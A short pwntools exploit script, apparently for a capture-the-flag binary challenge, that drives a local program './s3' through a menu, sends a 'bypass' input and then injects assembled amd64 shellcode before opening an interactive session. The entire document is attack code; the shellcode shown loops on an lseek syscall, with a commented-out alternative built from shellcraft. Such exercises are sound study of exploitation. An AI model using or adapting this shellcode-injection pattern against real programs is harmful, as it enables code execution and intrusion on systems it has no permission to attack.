from pwn import *
conn=process("./s3")
sh="""start:
    push 3
    pop rdi
    xor edx, edx
    push 0x60
    pop rsi
    push SYS_lseek
    pop rax
    syscall
	jmp start"""
#sh=shellcraft.amd64.linux.write(1, "ciaone", 7)
payload=asm(sh, arch="amd64")
conn.sendline(b"1")
conn.sendline(b"0")
conn.sendline(b"ciaone")
conn.sendline(b"3")
conn.sendline(b"bypass")
conn.sendline(payload)
print(payload)
#gdb.attach(conn)
#pause()
#conn.sendline(payload)
conn.interactive()
